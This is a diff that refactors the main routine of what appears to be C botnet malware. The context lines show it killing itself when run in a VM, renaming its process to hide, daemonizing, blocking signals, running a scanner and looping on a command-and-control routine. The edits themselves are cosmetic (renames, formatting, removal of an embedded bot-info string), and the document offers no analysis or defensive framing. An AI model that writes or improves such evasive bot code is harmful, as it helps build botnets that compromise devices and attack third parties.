@@ -5,8 +5,8 @@ int main(void)
     printd("Debug on!");
 
     // Initilize many things
-    rand_init();
-    printd("rand_init ok");
+    randInit();
+    printd("randInit ok");
     obfsc_init(); // Must be called first so we kill ourselves if it's a VM
     printd("obfsc_init ok");
     proc_init();
@@ -16,7 +16,7 @@ int main(void)
     comm_init();
     printd("comm_init ok");
 
-#   ifndef DEBUG
+#ifndef DEBUG
     prctl(PR_SET_NAME, MAIN_NAME, 0, 0, 0); // Change the process name
 
     pid_t pid, sid; /* Our process ID and Session ID */
@@ -49,18 +49,16 @@ int main(void)
     sigfillset(&mask);
     sigprocmask(SIG_SETMASK, &mask, NULL);
 
-    // Put some info about the bot in the ELF file for people to read
-    char *info = MAIN_BOTINFO;
-#   endif /* DEBUG */
+#endif // DEBUG
 
     printd("Starting!");
 
-#   ifdef SCANNER_FORCE
-    printd("Scanner force mode detected!");
+#ifdef SCANNER_FORCE
+    printd("Scanner test mode detected!");
     scan_scanner();
     exit(1);
-#   endif
-    
+#endif // SCANNER_FORCE
+
     while (1)
     {
 		if (comm_comm() == false)
